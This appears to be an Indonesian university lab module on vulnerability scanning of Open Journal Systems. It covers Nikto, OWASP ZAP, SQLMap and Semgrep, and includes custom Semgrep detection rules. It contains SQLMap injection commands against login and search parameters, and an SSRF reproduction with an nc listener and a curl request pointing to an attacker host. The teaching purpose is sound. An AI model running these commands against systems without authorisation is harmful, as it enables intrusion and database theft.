# Pertemuan 3 — Scanning OJS: SAST & DAST

## Tujuan Pembelajaran
Setelah pertemuan ini, mahasiswa mampu:
1. Menjalankan DAST menggunakan OWASP ZAP, Nikto, dan SQLMap
2. Menjalankan SAST menggunakan Semgrep terhadap source code OJS
3. Menginterpretasikan hasil output tool scanning
4. Mendokumentasikan temuan raw dari proses scanning

---

## 1. Perbedaan SAST dan DAST

| Aspek | SAST (Static) | DAST (Dynamic) |
|---|---|---|
| **Waktu Pengujian** | Sebelum aplikasi berjalan | Saat aplikasi berjalan |
| **Objek Analisis** | Source code, bytecode | Aplikasi yang live |
| **Akses Source Code** | Diperlukan | Tidak diperlukan |
| **False Positive** | Cukup tinggi | Lebih rendah |
| **Cakupan** | 100% code path | Hanya path yang diuji |
| **Contoh Tools** | Semgrep, SonarQube | OWASP ZAP, Nikto |

---

## 2. DAST — Dynamic Application Security Testing

### 2.1 Persiapan Lingkungan DAST

Pastikan tool berikut tersedia di mesin attacker (bukan VPS target):

```bash
# Cek ketersediaan tool
Burp Suite 
which sqlmap && sqlmap --version
zap.sh -version  # atau zaproxy -version
```



# SQLMap
sudo apt install sqlmap -y

# OWASP ZAP — download dari https://www.zaproxy.org/download/
# Atau gunakan Docker:
docker pull ghcr.io/zaproxy/zaproxy:stable
```

---

### 2.2 Nikto — Web Server Scanner

Nikto melakukan pemindaian terhadap konfigurasi web server, file berbahaya, dan kerentanan umum.

**Perintah dasar:**
```bash
nikto -h http://<IP-VPS>/ojs -o nikto_output.txt -Format txt
```

**Perintah lengkap dengan autentikasi:**
```bash
nikto -h http://<IP-VPS>/ojs \
  -id "admin:Admin@123" \
  -Tuning 123456789abc \
  -o nikto_output.html \
  -Format html
```

**Tuning flags yang relevan:**

| Flag | Keterangan |
|---|---|
| `1` | Interesting File / Seen in logs |
| `2` | Misconfiguration / Default File |
| `3` | Information Disclosure |
| `4` | Injection (XSS/Script/HTML) |
| `6` | Denial of Service |
| `9` | SQL Injection |
| `b` | Software Identification |
| `c` | Remote Source Inclusion |

**Contoh output yang perlu diperhatikan:**
```
+ /ojs/config.inc.php: PHP Config file may contain database IDs and passwords.
+ /ojs/lib/pkp/: Directory indexing enabled
+ /ojs/cache/: Directory indexing enabled
+ Cookie ojs3 created without the httponly flag
+ /ojs/index.php/index/login: Default OJS admin login found
```

> **Tugas:** Jalankan Nikto dan dokumentasikan semua temuan dalam tabel. Screenshot output wajib disertakan.

---

### 2.3 OWASP ZAP — Automated Scanner

ZAP (Zed Attack Proxy) adalah proxy web security testing yang memiliki fitur spider, active scan, dan passive scan.

#### A. Mode CLI (Headless)

```bash
# Passive scan + Spider + Active scan via Docker
docker run -v $(pwd):/zap/wrk/:rw \
  -t ghcr.io/zaproxy/zaproxy:stable \
  zap-full-scan.py \
  -t http://<IP-VPS>/ojs \
  -r zap_report.html \
  -J zap_report.json \
  -l WARN
```

#### B. Mode GUI

1. Jalankan ZAP → `Tools` → `Options` → `Local Proxies` → Set port 8080
2. Set browser proxy ke `127.0.0.1:8080`
3. Browse OJS secara manual (login, submit artikel, edit profil)
4. ZAP akan mencatat semua request (Passive scan)
5. Klik kanan pada node OJS → `Attack` → `Active Scan`

**Konfigurasi scan policy yang disarankan:**

```
Active Scan Policy:
  ✅ SQL Injection
  ✅ XSS (Reflected)
  ✅ XSS (Stored)
  ✅ Path Traversal
  ✅ Remote File Inclusion
  ✅ SSRF
  ⚠️  DoS tests → SET ke OFF
```

**Contoh alert ZAP yang perlu didokumentasikan:**

| Alert | Risk | URL | Parameter |
|---|---|---|---|
| Cross Site Scripting (Reflected) | High | `/search` | `query` |
| SQL Injection | High | `/login/signIn` | `username` |
| X-Content-Type-Options Header Missing | Low | semua | - |
| Cookie Without Secure Flag | Medium | `/login` | Cookie |
| Server Leaks Version Information | Low | semua | Server header |

#### C. Autentikasi dengan ZAP (untuk scan area terautentikasi)

```
ZAP → Sites → Klik kanan http://<IP-VPS> → 
  Include in Context → Konfigurasi Authentication:
  - Authentication Method: Form-based
  - Login URL: http://<IP-VPS>/ojs/index.php/index/login/signIn
  - Username Parameter: username
  - Password Parameter: password
  - Logged-in Indicator: .*Dashboard.*
```

---

### 2.4 SQLMap — SQL Injection Testing

> ⚠️ **Perhatian:** Gunakan SQLMap hanya terhadap target yang sudah disetujui. Jangan gunakan `--dbs` secara sembarangan.

**Langkah 1 — Identifikasi parameter yang rentan (dari ZAP/Nikto)**

```bash
# Test parameter login
sqlmap -u "http://<IP-VPS>/ojs/index.php/index/login/signIn" \
  --data="username=test&password=test&remember=0" \
  --method=POST \
  --dbs \
  --batch \
  --output-dir=./sqlmap_output
```

**Langkah 2 — Test parameter GET (search)**
```bash
sqlmap -u "http://<IP-VPS>/ojs/index.php/\$journal/search?query=test" \
  --dbs \
  --batch \
  --level=3 \
  --risk=2
```

**Langkah 3 — Gunakan request file dari ZAP**
```bash
# Simpan request dari ZAP ke file request.txt
sqlmap -r request.txt \
  --dbs \
  --batch \
  --tamper=space2comment
```

**Contoh output yang relevan:**
```
[INFO] testing connection to the target URL
[INFO] testing if GET parameter 'query' is dynamic
[INFO] heuristic (basic) test shows that GET parameter 'query' might be injectable
[INFO] GET parameter 'query' appears to be 'AND boolean-based blind' injectable
[INFO] available databases [2]:
[*] information_schema
[*] ojs_db
```

---

### 2.5 SSRF — Testing CVE-2021-27188

OJS ≤ 3.3.0-6 mengandung kerentanan **Server-Side Request Forgery** pada fitur Akismet plugin dan beberapa pengaturan jurnal.

**Reproduksi SSRF (Manual):**

```bash
# Setup listener di mesin attacker terlebih dahulu
nc -lvnp 4444

# Trigger SSRF melalui pengaturan jurnal (requires Editor role)
# POST ke endpoint journal settings dengan URL berbahaya
curl -b "session_cookie=<nilai>" \
  -X POST http://<IP-VPS>/ojs/index.php/$journal/management/settings/website \
  --data "styleSheet[uploadedFile]=http://<IP-ATTACKER>:4444/evil.css"
```

**Reproduksi via redirect parameter:**
```bash
# Test open redirect yang dapat di-chain dengan SSRF
curl -v "http://<IP-VPS>/ojs/index.php/index/login?source=http://127.0.0.1:3306"
```

---

## 3. SAST — Static Application Security Testing

### 3.1 Persiapan Source Code

```bash
# Di mesin analisis (bukan VPS target)
# Clone source code OJS 3.3.0-8
git clone --branch 3_3_0-8 https://github.com/pkp/ojs.git ojs-src
cd ojs-src

# Install submodule (termasuk lib/pkp)
git submodule update --init --recursive
```

---

### 3.2 Semgrep — Pattern-based SAST

Semgrep mencari pola berbahaya dalam source code menggunakan aturan yang dapat dikustomisasi.

**Install Semgrep:**
```bash
pip3 install semgrep
# atau
brew install semgrep
```

**Scan dengan ruleset OWASP PHP:**
```bash
# Scan kerentanan umum PHP
semgrep --config "p/php" \
  --output semgrep_php.json \
  --json \
  ./ojs-src

# Scan khusus injeksi (SQL, Command, SSTI)
semgrep --config "p/injection" \
  --output semgrep_injection.json \
  --json \
  ./ojs-src

# Scan kerentanan keamanan web
semgrep --config "p/owasp-top-ten" \
  --output semgrep_owasp.json \
  --json \
  ./ojs-src
```

**Filter hasil yang relevan:**
```bash
# Tampilkan hanya severity HIGH dan CRITICAL
cat semgrep_owasp.json | python3 -c "
import json, sys
data = json.load(sys.stdin)
results = [r for r in data['results'] if r.get('extra', {}).get('severity', '') in ['ERROR', 'WARNING']]
for r in results[:20]:
    print(f\"[{r['extra']['severity']}] {r['check_id']}\")
    print(f\"  File: {r['path']}:{r['start']['line']}\")
    print(f\"  Msg : {r['extra']['message'][:100]}\")
    print()
"
```

**Custom rule — Deteksi `eval()` berbahaya:**

Buat file `custom_rules.yaml`:
```yaml
rules:
  - id: php-eval-injection
    patterns:
      - pattern: eval($VAR)
      - pattern-not: eval("...")
    message: >
      Penggunaan eval() dengan variabel dapat menyebabkan Code Injection.
      Variabel $VAR berpotensi dikontrol oleh pengguna.
    languages: [php]
    severity: ERROR
    metadata:
      owasp: "A03:2021 – Injection"
      cwe: "CWE-95"

  - id: php-unserialize-user-input
    pattern: unserialize($_REQUEST[$KEY])
    message: >
      unserialize() dengan input user dapat menyebabkan Object Injection / RCE.
    languages: [php]
    severity: ERROR

  - id: php-file-include-variable
    patterns:
      - pattern: include($VAR)
      - pattern: require($VAR)
      - pattern: include_once($VAR)
      - pattern: require_once($VAR)
    message: Penggunaan include/require dengan variabel berpotensi Path Traversal / RFI
    languages: [php]
    severity: WARNING
```

```bash
semgrep --config custom_rules.yaml \
  --output semgrep_custom.json \
  --json ./ojs-src
```

---

### 3.3 phpcs-security-audit

```bash
# Install via Composer
composer global require "pheromone/phpcs-security-audit"

# Jalankan scan
phpcs --standard=Security \
  --extensions=php \
  --ignore=*/vendor/*,*/node_modules/* \
  ./ojs-src > phpcs_security_output.txt 2>&1
```

---

### 3.4 Manual Code Review — Titik Fokus

Lakukan code review manual pada file-file berikut (titik rawan historis):

| File | Alasan Review |
|---|---|
| `classes/security/authorization/` | Logic otorisasi |
| `lib/pkp/classes/db/DAO.inc.php` | Akses database, potential SQL injection |
| `classes/submission/SubmissionFileManager.inc.php` | File upload validation |
| `plugins/generic/` | Plugin pihak ketiga, attack surface luas |
| `lib/pkp/classes/template/PKPTemplateManager.inc.php` | Template rendering, XSS risk |

**Pola mencurigakan yang dicari saat manual review:**

```php
// ❌ BERBAHAYA: SQL tanpa prepared statement
$result = $this->retrieve("SELECT * FROM users WHERE username = '$username'");

// ❌ BERBAHAYA: Output tanpa escaping
echo $_GET['message'];

// ❌ BERBAHAYA: Validasi file upload hanya cek ekstensi
if (in_array(pathinfo($filename, PATHINFO_EXTENSION), ['jpg', 'png'])) { ... }

// ❌ BERBAHAYA: Unserialize data user
$obj = unserialize(base64_decode($_COOKIE['session_data']));

// ✅ AMAN: Prepared statement
$this->retrieveRange(
    'SELECT * FROM users WHERE username = ?',
    [$username]
);
```

---

## 4. Dokumentasi Temuan Scanning

### Template Dokumentasi Per Temuan

```markdown
## Temuan #[NOMOR]

| Field | Nilai |
|---|---|
| **Nama Kerentanan** | |
| **Tool Penemu** | DAST / SAST / Manual |
| **Tool Spesifik** | ZAP / Nikto / Semgrep / dst. |
| **URL / File** | |
| **Parameter / Baris Kode** | |
| **Method** | GET / POST / PUT |
| **Payload** | |
| **Response / Bukti** | |
| **OWASP Category** | A01–A10 |
| **Severity (Raw)** | Critical / High / Medium / Low / Info |

### Screenshot / Bukti
[lampirkan screenshot]

### Catatan
[catatan tambahan]
```

---

## 5. Checklist Scanning

Gunakan checklist ini untuk memastikan kelengkapan scanning:

### DAST Checklist
- [ ] Nikto dijalankan dan output tersimpan
- [ ] ZAP Spider dijalankan (minimal 100 URL terindeks)
- [ ] ZAP Active Scan dijalankan (unauthenticated)
- [ ] ZAP Active Scan dijalankan (authenticated sebagai Author)
- [ ] ZAP Active Scan dijalankan (authenticated sebagai Admin)
- [ ] SQLMap dijalankan pada minimal 3 parameter
- [ ] SSRF test dilakukan pada CVE-2021-27188
- [ ] Manual XSS test pada form search, profil, abstrak

### SAST Checklist
- [ ] Semgrep dengan ruleset `p/php` selesai dijalankan
- [ ] Semgrep dengan ruleset `p/owasp-top-ten` selesai dijalankan
- [ ] Custom rules Semgrep dijalankan
- [ ] Manual review pada 5 file kritis
- [ ] Temuan deduplikasi (hapus false positive)

---

## 6. Deliverable Pertemuan 3

| No | Deliverable | Format | Dikumpulkan Via |
|---|---|---|---|
| 1 | Raw output Nikto | `.txt` / `.html` | GitHub |
| 2 | Raw output ZAP (JSON + HTML report) | `.json` + `.html` | GitHub |
| 3 | Raw output Semgrep | `.json` | GitHub |
| 4 | Tabel temuan raw (minimal 10 temuan) | `.md` | GitHub |
| 5 | Screenshot bukti eksploitasi/temuan | `.png` | GitHub |
| 6 | Checklist scanning yang telah diisi | `.md` | GitHub |

---

## 7. Pertanyaan Diskusi

1. Mengapa DAST lebih cocok untuk menemukan **Stored XSS** dibanding SAST?
2. Apa kekurangan utama Semgrep dalam mendeteksi kerentanan business logic?
3. Jelaskan mengapa **false positive** menjadi masalah serius dalam SAST, terutama dalam pipeline CI/CD!
4. Pada kasus SSRF CVE-2021-27188, data apa yang dapat diakses attacker jika SSRF berhasil ke `http://127.0.0.1/`?

---

## Referensi
- OWASP ZAP Documentation: https://www.zaproxy.org/docs/
- Semgrep Registry: https://semgrep.dev/r
- Nikto Documentation: https://cirt.net/Nikto2
- SQLMap User Manual: https://sqlmap.org/
- OWASP Testing Guide v4.2 — OTG-INPVAL (Input Validation Testing)
